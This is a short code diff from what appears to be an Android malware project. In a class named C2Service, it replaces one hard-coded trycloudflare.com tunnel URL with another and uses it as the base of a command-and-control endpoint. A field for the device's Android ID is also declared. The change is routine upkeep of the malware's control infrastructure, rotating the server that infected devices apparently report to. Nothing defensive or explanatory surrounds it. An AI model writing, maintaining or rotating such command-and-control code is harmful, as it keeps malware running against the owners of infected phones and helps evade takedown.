@@ -11,7 +11,7 @@ import java.util.Timer;
 import java.util.TimerTask;
 
 public class C2Service extends Service {
-    private static final String BASE_URL = "https://drinking-marijuana-elder-facial.trycloudflare.com";
+    private static final String BASE_URL = "https://beautiful-vital-distinct-surgeons.trycloudflare.com";
     private static final String C2_URL = BASE_URL + "/api";
     private String androidId;
 
